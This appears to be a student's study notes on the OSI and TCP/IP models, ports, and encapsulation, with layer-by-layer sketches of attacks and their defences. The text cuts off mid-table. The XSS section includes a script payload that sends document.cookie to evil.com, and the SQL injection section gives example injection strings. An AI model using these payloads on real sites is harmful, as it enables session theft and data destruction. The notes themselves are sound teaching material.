

# OSI Model

OSI (Open Systems Interconnection) is a 7-layer reference model used to understand how data travels across a network.

## Mnemonic

```text
All People Seem To Need Data Processing
```

| Layer | Name | Main Function |
|---------|---------|---------|
| 7 | Application | User services |
| 6 | Presentation | Encryption, Formatting |
| 5 | Session | Session Management |
| 4 | Transport | End-to-End Delivery |
| 3 | Network | Routing, IP Addressing |
| 2 | Data Link | MAC Addressing, Switching |
| 1 | Physical | Signals & Cables |

---

## Layer 7 – Application

**Purpose:** Interface between user and network.

**Protocols:** HTTP, HTTPS, FTP, SMTP, DNS, DHCP

**Example:** Opening Gmail in a browser.

**Issues:** DNS failure, website not loading.

---

## Layer 6 – Presentation

**Purpose:** Data formatting, encryption, compression.

**Technologies:** SSL/TLS, JPEG, GIF, MPEG

**Example:** HTTPS encryption.

**Issues:** SSL certificate errors.

---

## Layer 5 – Session

**Purpose:** Create, maintain, terminate sessions.

**Example:** Logged-in Gmail session.

**Issues:** Session timeout, disconnects.

---

## Layer 4 – Transport

**Purpose:** Reliable or fast data delivery.

### TCP

- Reliable
- Acknowledgments
- Sequencing
- Error Recovery

### UDP

- Faster
- No acknowledgments
- No retransmission

### Common Ports

| Service | Port |
|-----------|------|
| HTTP | 80 |
| HTTPS | 443 |
| FTP | 21 |
| SSH | 22 |
| DNS | 53 |

### TCP Flags

- SYN → Start connection
- ACK → Acknowledge
- FIN → Close connection
- RST → Reset connection
- PSH → Push immediately

---

## Layer 3 – Network

**Purpose:** Routing packets between networks.

**Address:** IP Address

**Devices:** Router, Layer 3 Switch

**Protocols:** IP, ICMP, OSPF, RIP, BGP

**Example:** Sending traffic from India to a US server.

---

## Layer 2 – Data Link

**Purpose:** Communication within same network.

**Address:** MAC Address

**Devices:** Switch, Bridge

**Protocols:** Ethernet, PPP, ARP

**Example:** Switch forwarding frames.

---

## Layer 1 – Physical

**Purpose:** Transmission of bits.

**Devices:** Cables, Hub, Repeater, Fiber

**Example:** Ethernet cable connection.

---

# PDU (Protocol Data Unit)

| Layer | PDU |
|---------|---------|
| 7-5 | Data |
| 4 | Segment / Datagram |
| 3 | Packet |
| 2 | Frame |
| 1 | Bits |

---

# Encapsulation

```text
Application Data
       ↓
TCP Header
       ↓
IP Header
       ↓
Ethernet Header
       ↓
Transmission
```

# Decapsulation

```text
Ethernet Header Removed
       ↓
IP Header Removed
       ↓
TCP Header Removed
       ↓
Application Data
```

---

# MTU (Maximum Transmission Unit)

**Definition:** Maximum packet size transmitted without fragmentation.

**Ethernet MTU:** 1500 Bytes

### Why Important?

- Prevents fragmentation
- Improves performance
- Reduces overhead

---

# IP Fragmentation

Occurs when packet size > MTU.

### Drawbacks

- Slower communication
- Extra processing
- Packet reassembly required

### DF (Don't Fragment) Flag

```text
Packet > MTU + DF Set
            ↓
       Packet Dropped
            ↓
      ICMP Error
```

---

# Wireshark View

```text
Ethernet Frame
    └── IP Packet
          └── TCP Segment
                └── HTTP Data
```

---

# Troubleshooting Using OSI

| Problem | Layer |
|-----------|--------|
| Cable unplugged | Layer 1 |
| Switch issue | Layer 2 |
| Wrong IP | Layer 3 |
| Port blocked | Layer 4 |
| Session timeout | Layer 5 |
| SSL error | Layer 6 |
| Website not loading | Layer 7 |

---

# Exam Revision

### Addresses

```text
Layer 3 → IP Address
Layer 2 → MAC Address
```

### Devices

```text
Router  → Layer 3
Switch  → Layer 2
Hub     → Layer 1
```

### Remember

- TCP = Reliable
- UDP = Fast
- MTU = Maximum Packet Size
- Fragmentation = Packet Splitting
- Encapsulation = Adding Headers
- Decapsulation = Removing Headers






# 🛡️ Akshat's Cybersecurity Notes — Day 1
## OSI Model & TCP/IP — In Simple Language with Real Examples

> **Written like a friend explaining it, not a textbook.**
> Based on: Professor Messer Network+ N10-008

---

## 🎯 Before We Start — Why Should YOU Care About This?

Imagine you're a SOC analyst and an alert fires in your SIEM:
*"Suspicious traffic detected from IP 192.168.1.50"*

Your first question should be: **"WHERE in the network is this happening?"**

Is the attacker:
- Physically plugging into a network cable? → **Layer 1 problem**
- Faking a MAC address? → **Layer 2 problem**
- Sending millions of fake packets? → **Layer 3/4 problem**
- Injecting code into a website? → **Layer 7 problem**

The OSI model is your **map of where attacks happen**. Once you know the layer, you know which tool to use and how to stop it. That's why this matters.

---

## 📦 The Big Idea — What Is a "Model" Anyway?

Think of sending a letter to a friend in another city.

You don't just magically teleport the letter. There's a **process**:
1. You **write** the letter
2. You put it in an **envelope** with the address
3. You hand it to the **post office**
4. The post office puts it on a **truck**
5. The truck drives on **roads**
6. At the destination, the process **reverses**

The OSI model is the same idea — but for data traveling across a network. **7 departments** (layers), each with their own specific job. Data passes through each department when being sent, and each department in reverse when being received.

---

# 🏛️ PART 1 — THE OSI MODEL (7 Layers)

## The 7 Layers — Quick Overview First

```
Layer 7 — APPLICATION    ← You live here (browser, email, WhatsApp)
Layer 6 — PRESENTATION   ← Encryption, compression, translation
Layer 5 — SESSION        ← Managing connections (login sessions)
Layer 4 — TRANSPORT      ← Delivery guarantee (TCP/UDP, port numbers)
Layer 3 — NETWORK        ← Addresses & routing (IP addresses)
Layer 2 — DATA LINK      ← Local delivery (MAC addresses)
Layer 1 — PHYSICAL       ← Actual cables, Wi-Fi signals, bits
```

### 🧠 Memory Trick to Never Forget

**Top to bottom (7 → 1):**
> **A**ll **P**eople **S**eem **T**o **N**eed **D**ata **P**rocessing

**Bottom to top (1 → 7):**
> **P**lease **D**o **N**ot **T**hrow **S**ausage **P**izza **A**way

---

## 🔌 Layer 1 — Physical Layer

### What Is It In Simple Words?

Layer 1 is the **actual, physical stuff** — the cables, the Wi-Fi radio signals, the light pulses in fibre optic cable. It has ONE job: **move 0s and 1s from point A to point B**.

It doesn't know what those 0s and 1s mean. It just sends them.

### Real Life Example 🌍

> Imagine you're talking to your friend on the phone. Your voice gets converted to electrical signals and sent through wires (or radio waves if you're on mobile). The phone wire doesn't understand what you're saying — it just carries the signal. **That wire is Layer 1.**

### What Devices Live Here?

| Device | What It Does |
|--------|-------------|
| **Hub** | Receives signal on one port, blindly sends it to ALL other ports. Like shouting in a room — everyone hears everything. Security nightmare! |
| **Repeater** | Boosts weak signals over long distances. Like a mobile tower strengthening your signal. |
| **Network cables** | Copper wire (UTP), fibre optic, Wi-Fi radio waves |
| **NIC (Network Interface Card)** | The physical card in your computer that connects to the network |

### Types of Media (How Bits Travel)

| Medium | How It Works | Real Example |
|--------|-------------|-------------|
| **Copper cable (UTP)** | Electrical signals through metal wire | Ethernet cable you plug into your laptop |
| **Fibre optic** | Light pulses through glass | Internet cables under the ocean connecting continents |
| **Wireless** | Radio waves through air | Your phone connecting to Wi-Fi |

### 🔴 Security at Layer 1 — How Do Attackers Target This?

**Attack:** Physical wiretapping
- An attacker physically cuts into a network cable and attaches a device to listen to all traffic passing through
- Like someone tapping your phone line in old spy movies

**Attack:** Rogue access point
- Attacker plugs in a fake Wi-Fi router in your office. Employees connect to it thinking it's the company Wi-Fi. Attacker sees all traffic.

**Defence:** Lock your server rooms. Use fibre optic (much harder to tap). Check for unknown devices connected to network ports.

> 💡 **SOC Analyst tip:** Layer 1 attacks won't show up in your SIEM. Your firewall can't see a physical cable tap. This is why physical security (locked rooms, security cameras) is part of cybersecurity — not just software!

---

## 🔗 Layer 2 — Data Link Layer

### What Is It In Simple Words?

Layer 2 handles **local delivery** — getting data from one device to another **on the same network**. It uses **MAC addresses** instead of IP addresses.

Think of IP addresses as your house address (for long-distance mail) and MAC addresses as the **room number inside a building** (for local delivery within the building).

### Real Life Example 🌍

> Imagine you're in a big office building. To deliver a document to your colleague, you don't need their home address — you just need their **desk number** (Room 201, Floor 3). You walk there directly. That's Layer 2. It's delivery within the same building (network).

### What Is a MAC Address?

MAC = **Media Access Control** address. Every single device in the world has a unique MAC address burned into its network card by the manufacturer.

```
Format: AA:BB:CC:DD:EE:FF
         ─────────  ─────────
         Manufacturer  Device ID
         (First 3      (Last 3
          bytes =       bytes)
          who made it)

Example: 00:50:56:AA:BB:CC
         └── 00:50:56 = VMware made this device
```

**Special MAC addresses:**
- `FF:FF:FF:FF:FF:FF` = **Broadcast** — send to EVERYONE on the local network

### 🤔 How Does ARP Work? (Super Important!)

**The Problem:** You know your friend's IP address (like knowing their phone number) but the switch needs their MAC address (like needing their physical location in the building) to deliver data locally.

**Solution: ARP (Address Resolution Protocol)**

**Step-by-step example:**
1. Your computer wants to talk to `192.168.1.1` (your router)
2. Your computer shouts to EVERYONE on the network: *"Hey! Who has IP 192.168.1.1? Tell me your MAC address!"*
3. Your router hears this and responds: *"That's me! My MAC is AA:BB:CC:DD:EE:FF"*
4. Your computer saves this in its **ARP cache** (a small table: IP → MAC)
5. Now your computer can send frames directly to the router

```
ARP Request:  "Who has 192.168.1.1?" ──→ (to everyone: FF:FF:FF:FF:FF:FF)
ARP Reply:    "I have it! My MAC is AA:BB:CC:DD:EE:FF" ──→ (back to you)
```

> 💡 Run `arp -a` in your terminal right now. You'll see your device's ARP cache — a list of IP → MAC mappings it has learned!

### Devices at Layer 2

| Device | How It Works |
|--------|-------------|
| **Switch** | Smart device. Learns which MAC address is on which port. Sends frames ONLY to the correct port. Like a smart receptionist who knows exactly which desk each person sits at. |
| **Hub (Layer 1)** | Dumb device. Sends everything to everyone. |
| **Bridge** | Connects two network segments at Layer 2. Old technology, mostly replaced by switches. |

### 🔴 Security Attacks at Layer 2

#### Attack 1: ARP Poisoning (Super Common in Interviews!)

**How it works:**
1. You (victim) and your router are talking normally
2. Attacker sends a fake ARP reply to your computer: *"Hey! 192.168.1.1 (the router) is at MY MAC address"*
3. Your computer believes this and updates its ARP cache
4. Now all your traffic goes to the **attacker's device** instead of the router
5. Attacker reads your traffic (Man-in-the-Middle attack) and forwards it to the real router so you don't notice

```
Normal:   Your PC ──────────────────→ Router → Internet
           
After ARP Poisoning:
          Your PC ──→ Attacker's PC ──→ Router → Internet
                       (reads everything!)
```

> 🔍 **How to detect:** Open Wireshark and filter `arp`. Look for duplicate ARP replies — if two different MAC addresses claim to be the same IP, someone is poisoning ARP!

#### Attack 2: MAC Flooding

**How it works:**
- Attacker floods a switch with thousands of fake MAC addresses
- Switch's memory (CAM table) fills up completely
- Switch panics and starts behaving like a dumb **hub** — sends everything to everyone
- Attacker can now see all network traffic

**Defence:** Switch port security (limit MACs per port), Dynamic ARP Inspection (DAI)

---

## 🌐 Layer 3 — Network Layer

### What Is It In Simple Words?

Layer 3 is about **routing** — finding the path to send data across multiple networks to reach a distant destination. This is where **IP addresses** live.

If Layer 2 is delivery within a building, **Layer 3 is postal delivery between cities** — it needs a proper address and knows which roads to take.

### Real Life Example 🌍

> Imagine you're sending a letter from Mumbai to Delhi. The post office in Mumbai doesn't directly deliver to Delhi — it sends it to the post office in Nagpur, which sends it to Agra, which sends it to Delhi. Each post office is a **router**. Each city is a **network**. The address on the envelope is the **IP address**.

### IP Addresses — Explained Simply

An IP address is like a **home address for your device on the internet**. Every device on the internet needs one.

**IPv4 — The most common type:**
```
Format: 192.168.1.100
         ───  ───  ─  ───
          ↑    ↑   ↑   ↑
          |    |   |   └── Host part (which device in the network)
          |    |   └────── Still network part
          |    └────────── Network part (which network/area)
          └─────────────── Network part
```

Think of it like an Indian address:
```
India → Maharashtra → Mumbai → Andheri → Flat 101
 ↑           ↑          ↑        ↑          ↑
Country    State      City    Area      House No.
                   
192    →    168    →   1   →          →   100
```

### Private vs Public IP Addresses

| Type | Ranges | Used For |
|------|--------|---------|
| **Private** (not on internet) | 10.x.x.x | Large company networks |
| **Private** (not on internet) | 172.16.x.x – 172.31.x.x | Medium networks |
| **Private** (not on internet) | 192.168.x.x | Home/small office (your router!) |
| **Public** (on internet) | Everything else | Websites, servers |

> 💡 When you check your phone's IP, you'll see something like `192.168.1.5` — that's a **private IP**. Your router has a **public IP** that represents your entire home network to the internet. This translation is done by **NAT** (Network Address Translation).

### Special IP Addresses You Must Know

| IP | Name | What It Means |
|----|------|--------------|
| `127.0.0.1` | **Loopback** | "Send back to myself." Used to test if your own network stack works. `ping 127.0.0.1` — if it replies, your device's networking is working. |
| `0.0.0.0` | **Default route** | Means "everything else — if no specific route exists, send it here" |
| `255.255.255.255` | **Broadcast** | Send to all devices on the local network |
| `169.254.x.x` | **APIPA** | Your device couldn't find a DHCP server to get an IP, so it made one up. Usually means something is wrong! |

### Subnet Masks — Made Simple

**The problem:** How does your computer know if another IP is on its local network or far away?

**Answer:** The subnet mask!

Think of it like this:
- Your IP: `192.168.1.50`
- Subnet mask: `255.255.255.0` (same as `/24`)
- This means: the first 3 numbers (`192.168.1`) are the **neighbourhood** (network), the last number (`.50`) is **your house** (host)

```
192.168.1.50  with mask 255.255.255.0

Network part → 192.168.1  (everyone in this neighbourhood)
Host part    → .50        (you specifically)

Others in same network: 192.168.1.1, 192.168.1.2, ... 192.168.1.254
```

**CIDR notation** is just a shorter way to write the same thing:
- `255.255.255.0` = `/24` (first 24 bits are network)
- `255.255.0.0` = `/16`
- `255.0.0.0` = `/8`

### Devices at Layer 3

| Device | What It Does |
|--------|-------------|
| **Router** | The main Layer 3 device. Reads IP addresses and decides the best path to send packets. Your home Wi-Fi box is a router! |
| **Layer 3 Switch** | A switch that can also route. Used in large enterprise networks. |

### 🔴 Security Attacks at Layer 3

#### Attack 1: IP Spoofing
**How it works:** Attacker fakes the source IP address in a packet. Like writing a fake return address on a letter. Used to hide identity or trick servers into sending responses to a victim.

#### Attack 2: ICMP Flood (Ping Flood)
**How it works:** Attacker sends millions of `ping` requests to a target. Target spends all its time responding and can't serve real users. This is a DoS (Denial of Service) attack.

> 🔍 **In Wireshark:** Filter `icmp` — you'll see ping requests (echo request) and responses (echo reply). A sudden flood of ICMP packets is suspicious!

---

## 🚚 Layer 4 — Transport Layer *(Most Important for Security!)*

### What Is It In Simple Words?

Layer 4 decides **how** data gets delivered — reliably or fast. It uses **port numbers** to know which application should receive the data.

Think of it like a delivery company:
- **TCP** = Registered post with tracking, signature required. Guaranteed delivery, but slower.
- **UDP** = Regular drop-in-the-letterbox post. Fast, no guarantee.

### Real Life Example 🌍

> You order something on Amazon (**TCP** — you want confirmation it arrived). You watch a live cricket match on Hotstar (**UDP** — a few seconds of buffering is okay, but you don't want to pause every ball for acknowledgement).

### Port Numbers — What Are They?

Ports are like **apartment numbers** in a building. The IP address gets you to the building (device). The port number gets you to the right apartment (application).

**Example:**
```
Your browser wants to visit google.com

IP address 142.250.80.46  →  Gets to Google's server (the building)
Port 443                  →  Goes to the HTTPS web server app (the apartment)

Full address: 142.250.80.46:443
              ─────────────  ───
              IP (building)  Port (apartment)
```

### Critical Ports — Learn These by Heart!

| Port | Service | Easy Way to Remember | Security Risk |
|------|---------|---------------------|---------------|
| **21** | FTP | File Transfer | Sends password in clear text — anyone can read it! |
| **22** | SSH | Secure Shell | Safe, but attackers brute-force it constantly |
| **23** | Telnet | Like SSH but dangerous | NEVER use — everything in plain text |
| **25** | SMTP | Email sending | Used to send phishing emails |
| **53** | DNS | Domain lookup | Used for data exfiltration (DNS tunnelling) |
| **80** | HTTP | Normal web | Everything visible — no encryption |
| **443** | HTTPS | Secure web | Encrypted — use this always |
| **445** | SMB | Windows file sharing | EternalBlue (WannaCry ransomware) used this! |
| **3306** | MySQL | Database | NEVER expose to internet |
| **3389** | RDP | Windows Remote Desktop | Biggest brute-force target in the world |

> 💡 **Quick test:** Open your terminal and type `netstat -an`. You'll see all open ports on your device right now!

---

## TCP — The Careful One

### The 3-Way Handshake — Made Super Simple

Before TCP sends any data, it first "shakes hands" to establish a connection. Think of it like calling someone on the phone before talking:

```
You calling a friend:

Step 1 — SYN:     You: "Hello? Can you hear me?" 📞
Step 2 — SYN-ACK: Friend: "Yes I can hear you! Can you hear me?" 📞
Step 3 — ACK:     You: "Yes! Great, let's talk." ✅
         
         (Now actual conversation begins)
```

In networking:
```
Step 1 — SYN:     Client → Server: "Hey, I want to connect. My sequence number is 100."
Step 2 — SYN-ACK: Server → Client: "OK! Got your 100. My sequence number is 200."
Step 3 — ACK:     Client → Server: "Got your 200. Connection ready!"

(Now data flows both ways)
```

> 🔍 **In Wireshark:** Filter `tcp.flags.syn==1` to see only SYN packets — you'll see every TCP connection being started. Filter `tcp.flags.syn==1 && tcp.flags.ack==0` to see ONLY the first SYN (not SYN-ACK).

### TCP Flags — What Are They?

Think of flags as **signals** inside each TCP packet, like signals you wave during a conversation:

| Flag | Signal | When Used |
|------|--------|-----------|
| **SYN** | "I want to start talking" | Beginning of connection |
| **ACK** | "I heard you" | Confirming received data |
| **FIN** | "I'm done talking" | Ending connection nicely |
| **RST** | "Stop! Something's wrong!" | Abrupt connection termination |
| **PSH** | "Don't wait, give this to the app NOW" | Urgent forwarding |
| **URG** | "This is super urgent!" | Rarely used today |

### 🔴 SYN Flood Attack — Using the Handshake Against Servers

**How it works (simple explanation):**

Imagine you call 1000 people at the same time and say "Hello, can you hear me?" — but when they all reply "Yes, can you hear me?", you NEVER respond. They're all stuck waiting for your answer. They can't hang up because they're waiting. **No one else can call them** because all their phone lines are busy.

That's a SYN Flood:
```
Attacker sends: SYN, SYN, SYN, SYN (thousands of them, with fake source IPs)
Server replies: SYN-ACK, SYN-ACK, SYN-ACK (waiting for the final ACK)
Attacker does:  Nothing (ACK never comes)
Result:         Server's connection table fills up — real users can't connect!
```

**Defence:** SYN Cookies (server doesn't reserve resources until the final ACK arrives)

---

## UDP — The Fast One

### Simple Explanation

UDP is like sending a WhatsApp message — you send it and don't wait for delivery confirmation. Usually it arrives. Sometimes it doesn't. You don't get a "delivered" tick.

**When is this OK?**
- Video calls (a few dropped frames = slightly blurry for a moment — acceptable)
- Online gaming (a few lost packets = minor lag — acceptable)
- DNS lookups (quick question/answer — don't need handshake)
- Live cricket streaming (slight glitch > 30-second delay)

**When is this NOT OK?**
- Downloading a file (one corrupted byte = file won't work — use TCP)
- Sending an email (must arrive complete — use TCP)
- Banking transactions (every byte must be correct — use TCP)

### TCP vs UDP — Side by Side

| Feature | TCP | UDP |
|---------|-----|-----|
| **Connection** | Handshake required | No handshake — just send |
| **Reliability** | Guaranteed delivery | No guarantee |
| **Speed** | Slower (overhead) | Faster (lightweight) |
| **Order** | Arrives in correct order | May arrive out of order |
| **Use cases** | Web, email, file transfer, SSH | Video, gaming, DNS, VoIP |
| **Header size** | 20 bytes | 8 bytes |
| **Protocol examples** | HTTP, HTTPS, FTP, SSH, SMTP | DNS, DHCP, streaming, gaming |

---

## 💬 Layer 5 — Session Layer

### What Is It In Simple Words?

Layer 5 manages the **conversation** between two applications. It decides: when to start talking, keeps the conversation going, and decides when it's finished.

### Real Life Example 🌍

> Think of logging into your bank's website. You log in once, and then you can browse multiple pages — view balance, transfer money, download statement — **without logging in again for each page**. The bank's server remembers you're in a session. That "you're logged in and I remember you" — that's the Session layer at work.

**Another example:** When you're on a video call on Google Meet:
- The session starts when you join
- It's maintained throughout your call (even if there's a brief internet hiccup)
- It ends when you click "Leave call"

### Session Cookies — The Most Important Session Concept for Security

When you log into any website, the server gives your browser a **session cookie** — a unique token that says "this person is logged in".

```
You login with username + password
Server verifies → gives you a cookie: "sessionID=abc123xyz"
Your browser stores this cookie
Every page you visit sends this cookie: "sessionID=abc123xyz"
Server sees the cookie and knows you're already logged in — no re-login needed
```

### 🔴 Session Hijacking Attack

**How it works:**
1. You're logged into your bank
2. Attacker somehow gets your session cookie (via network sniffing, XSS attack, or stolen from browser)
3. Attacker puts that cookie in their own browser
4. Bank's server sees a valid session cookie and thinks it's YOU
5. Attacker is now in your account — without ever knowing your password!

**Defence:** HTTPS (so cookie can't be sniffed), `Secure` flag on cookies (only sent over HTTPS), `HttpOnly` flag (JavaScript can't steal it), session timeout (cookie expires)

---

## 🎨 Layer 6 — Presentation Layer

### What Is It In Simple Words?

Layer 6 is the **translator**. It makes sure that data from one application can be understood by another application — even if they use different formats. It also handles **encryption** and **compression**.

### Real Life Example 🌍

> Imagine you write a letter in Hindi and your friend only reads English. You need a translator in between. That's the Presentation layer — it translates data formats so different systems can understand each other.

**Another example:** When you open a JPEG photo:
- The photo is stored as compressed binary data
- Layer 6 decompresses and decodes it into the actual image you see
- This format conversion happens at the Presentation layer

### What Actually Happens Here?

| Function | What It Means | Real Example |
|----------|---------------|-------------|
| **Encryption** | Scrambles data so only the receiver can read it | HTTPS uses TLS encryption here |
| **Decryption** | Unscrambles received data | Your browser decrypts the HTTPS response |
| **Compression** | Makes data smaller to save bandwidth | GZIP compresses web pages before sending |
| **Format conversion** | Translates between data formats | Converting text from ASCII to Unicode |
| **Encoding** | Converts data to a transmittable format | Base64 encoding of email attachments |

### TLS — The Most Important Layer 6 Concept

TLS (Transport Layer Security) is what makes HTTPS secure. Without it, every website you visit would be completely readable by anyone on your network.

```
WITHOUT TLS (HTTP):
You → Router → Attacker → Internet → Website
        ↑
   Attacker sees: "Username: akshat, Password: mypassword123"

WITH TLS (HTTPS):
You → Router → Attacker → Internet → Website
        ↑
   Attacker sees: "4g7hk2!#@xz8qp..." (gibberish — encrypted!)
```

### 🔴 SSL Stripping Attack

**How it works:**
- Attacker sits between you and the website (MITM)
- You try to connect to `https://mybank.com`
- Attacker intercepts and connects to bank over HTTPS (secure)
- But gives YOU an `http://` connection (unsecure)
- You think you're on a secure page (your browser might even show a lock icon)
- Attacker can read everything you send

**Defence:** HSTS (HTTP Strict Transport Security) — browser only accepts HTTPS for that site, ever. Websites register for HSTS preloading in browsers.

---

## 📱 Layer 7 — Application Layer

### What Is It In Simple Words?

Layer 7 is where **you and your applications** interact with the network. When you open Chrome, WhatsApp, or your email — you're at Layer 7. This is the top of the stack.

This is also where **most attacks happen** — because this is where your actual data and business logic live.

### Real Life Example 🌍

> Layer 7 is like the customer service desk at a bank. It's the human-facing part — where you actually interact. All the backend processing (wires, computers, databases) is the lower layers. You only see and interact with the customer service desk (Layer 7).

### The Most Important Layer 7 Protocols

#### HTTP and HTTPS — How Websites Work

```
You type: google.com in browser
Browser sends: GET /search?q=cybersecurity HTTP/1.1
               Host: google.com
               
Google responds: HTTP/1.1 200 OK
                 Content-Type: text/html
                 
                 <html>...the webpage...</html>
```

- **HTTP (port 80):** No encryption. Like sending a postcard — anyone can read it.
- **HTTPS (port 443):** Encrypted with TLS. Like sending a sealed, tamper-proof envelope.

#### DNS — The Internet's Phone Book

**The Problem:** Humans remember names (google.com). Computers need numbers (142.250.80.46). DNS translates between them.

**How DNS works step by step:**

```
You type: google.com

Step 1: Your computer checks its own DNS cache (did I look this up recently?)
        → Not found

Step 2: Asks your router's DNS (usually your ISP's DNS: 8.8.8.8 for Google DNS)
        "Hey, what's the IP for google.com?"

Step 3: DNS server checks its cache
        → Found! 142.250.80.46

Step 4: DNS replies to your computer with the IP

Step 5: Your computer connects to 142.250.80.46

Total time: Usually under 50 milliseconds!
```

> 💡 **Try it yourself:** Open terminal and type `nslookup google.com` — you'll see DNS resolve the domain to an IP in real time!

#### SMTP, IMAP, POP3 — How Email Works

This confuses a lot of people. Here's the simple version:

```
Sending email (SMTP — port 25/587):
You write email → Your email client → SMTP server (like Gmail's server) → Recipient's SMTP server → Delivered

Reading email — two options:
IMAP (port 143/993):  Email stays on server. You can read from phone AND laptop. Delete on one = delete on all.
POP3 (port 110/995):  Email downloaded to your device. Removed from server. Phone and laptop won't sync.
```

**Security:** Always use IMAPS (993) or POP3S (995) — the 'S' means SSL/TLS encrypted. Never use the unencrypted versions.

#### SSH vs Telnet — Night and Day Difference

```
Telnet (port 23):  Everything in clear text
                   "username: admin" → anyone on network can see this!
                   "password: admin123" → visible to all!
                   Think: Shouting your password in a public market

SSH (port 22):     Everything encrypted
                   "8f2kd!@#$^&..." → gibberish to anyone intercepting
                   Think: Whispering your password to someone in a locked room
```

**Rule:** If you ever see Telnet open on a device in your SOC, that's an immediate alert. Telnet should never exist on any modern network.

### 🔴 The Most Common Layer 7 Attacks

#### SQL Injection — Explained with a Story

**Imagine this scenario:**

A restaurant has an order system. You type your name and order:
```
Name: Akshat
Order: Butter Chicken
```

The kitchen system stores: `ORDER FROM Akshat: Butter Chicken`

Now a hacker types:
```
Name: Akshat'; DROP TABLE orders; --
Order: Butter Chicken
```

The kitchen system processes: `ORDER FROM Akshat'; DROP TABLE orders; --`

The `'; DROP TABLE orders; --` part is **SQL code** that deletes the entire orders database!

**In web terms:**
```
Normal login:
Username: akshat
Password: mypass
SQL query: SELECT * FROM users WHERE username='akshat' AND password='mypass'

SQL Injection:
Username: akshat' OR '1'='1
Password: anything
SQL query: SELECT * FROM users WHERE username='akshat' OR '1'='1' AND password='anything'
           
'1'='1' is ALWAYS true → logs in without correct password!
```

**Defence:** Never build SQL queries with user input directly. Use parameterized queries (prepared statements).

#### XSS — Cross-Site Scripting

**Simple explanation:**

A website lets users post comments. A normal user posts:
```
"Great article! Thanks for sharing."
```

An attacker posts:
```html
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
```

When other users visit the page, their browser **executes this JavaScript**. Their session cookies get sent to the attacker's server. Attacker now has everyone's session cookies → can log in as any of them.

**Defence:** Websites must sanitise and escape user input before displaying it. Content Security Policy (CSP) headers.

#### Phishing — The Most Common Attack in the World

**Why it's a Layer 7 attack:** It exploits the HTTP/HTTPS protocol and email (SMTP) to deliver fake websites and fake emails that look real.

**How it works:**
```
Attacker creates: http://www.g00gle.com (notice double-zero, not letter-o)
Victim sees:      Looks exactly like Google's login page
Victim types:     Their Google username and password
Attacker gets:    Credentials → Can now access real Google account
```

---

# 🌐 PART 2 — THE TCP/IP MODEL

## What Is the TCP/IP Model?

While OSI is the **theory** (like a textbook diagram), TCP/IP is the **reality** — it's what actually runs on the internet today. It has 4 layers instead of 7 (it merges some OSI layers together).

### Real Life Example 🌍

> OSI is like a detailed recipe book with 7 chapters. TCP/IP is like the actual dish your mum makes — simplified, practical, works every time.

## The 4 Layers — Side by Side with OSI

```
OSI Model (7 layers)          TCP/IP Model (4 layers)
─────────────────────         ──────────────────────────
7. Application   ─┐
6. Presentation  ─┼──────────→  4. Application
5. Session       ─┘
4. Transport     ─────────────→  3. Transport
3. Network       ─────────────→  2. Internet
2. Data Link     ─┐
1. Physical      ─┴──────────→  1. Network Access (Link)
```

### Layer 1 (TCP/IP) — Network Access

Combines OSI Layers 1 and 2. Everything about physical transmission AND local addressing (MAC addresses, frames).

Protocols here: **Ethernet, Wi-Fi, ARP, MAC addressing**

### Layer 2 (TCP/IP) — Internet

Same as OSI Layer 3. Handles IP addressing and routing.

Protocols here: **IP (v4/v6), ICMP, routing protocols (OSPF, BGP)**

### Layer 3 (TCP/IP) — Transport

Identical to OSI Layer 4. TCP and UDP. Port numbers.

Protocols here: **TCP, UDP**

### Layer 4 (TCP/IP) — Application

Combines OSI Layers 5, 6, and 7. All application-level protocols.

Protocols here: **HTTP, HTTPS, FTP, SSH, DNS, SMTP, DHCP, and everything else your apps use**

---

# 📦 PART 3 — ENCAPSULATION (How Data Actually Travels)

## The Most Important Concept to Understand

When you send data across a network, each layer **wraps it in its own envelope** — adding its own header with addressing information. This is called **encapsulation**.

Think of it like Russian nesting dolls (Matryoshka dolls) — each layer is a doll inside a bigger doll.

## Real Life Example — Sending a Letter via Courier 🌍

Imagine you want to send an important document to a company:

```
You write the document          → APPLICATION DATA
Put it in an envelope with "To: Accounts dept, Re: Invoice"  → SESSION/PRESENTATION
Put that in a box labelled "FRAGILE, Handle with care"       → TCP SEGMENT
Courier labels the box: "From: Mumbai, To: Delhi"            → IP PACKET  
Courier loads it on a truck: "This truck goes to Nagpur"     → ETHERNET FRAME
Truck drives on the road                                     → PHYSICAL BITS
```

At the destination, each layer **opens its envelope** and passes the contents up.

## Step-by-Step: What Happens When You Open google.com

Let's trace a real request:

```
Step 1 — APPLICATION LAYER
You type google.com → Browser creates:
"GET / HTTP/1.1
 Host: www.google.com"

Step 2 — DNS LOOKUP (still Application)
Browser asks DNS: "What is google.com's IP?"
DNS replies: "142.250.80.46"

Step 3 — TRANSPORT LAYER (TCP)
Browser starts 3-way handshake with 142.250.80.46:443
SYN → SYN-ACK → ACK (connection established!)
Browser's port: 54321 (random ephemeral port)
Google's port: 443 (HTTPS)

Creates TCP segment:
[Source Port: 54321 | Dest Port: 443 | SEQ: 100 | ACK: 201 | DATA: HTTP request]

Step 4 — INTERNET LAYER (IP)
Wraps TCP segment in IP packet:
[Source IP: 103.28.52.10 | Dest IP: 142.250.80.46 | TTL: 64 | DATA: TCP segment]

Step 5 — NETWORK ACCESS (Ethernet)
Wraps IP packet in Ethernet frame:
[Source MAC: AA:BB:CC | Dest MAC: Router's MAC | DATA: IP packet | CRC checksum]

Step 6 — PHYSICAL
Frame converted to electrical signals (or Wi-Fi radio waves)
Transmitted to router

Step 7 — AT YOUR ROUTER
Router strips Ethernet frame (Layer 2)
Reads IP address (Layer 3): "This goes to Google!"
Creates new Ethernet frame for next hop
Sends it toward Google

... packet hops through 10-15 routers across the internet ...

Step 8 — AT GOOGLE'S SERVER
Physical → Network Access → Internet → Transport → Application
Google's web server reads the HTTP request
Sends back the webpage HTML
```

## PDU Names — What Data Is Called at Each Layer

| Layer | Name for Data | What's Added |
|-------|--------------|-------------|
| Application | **Data** or **Message** | HTTP headers, email headers |
| Transport | **Segment** (TCP) or **Datagram** (UDP) | Port numbers, sequence numbers |
| Network/Internet | **Packet** | IP addresses, TTL |
| Data Link | **Frame** | MAC addresses, CRC error check |
| Physical | **Bits** | 0s and 1s |

> 💡 **Memory trick:** "**Do** **S**ome **P**eople **F**ear **B**irthdays?" → Data, Segment, Packet, Frame, Bits

---

# 🔒 PART 4 — PROTOCOLS QUICK REFERENCE

## Every Port You Need to Know (With Security Notes)

| Port | Protocol | Encrypted? | Security Risk | Action |
|------|----------|-----------|--------------|--------|
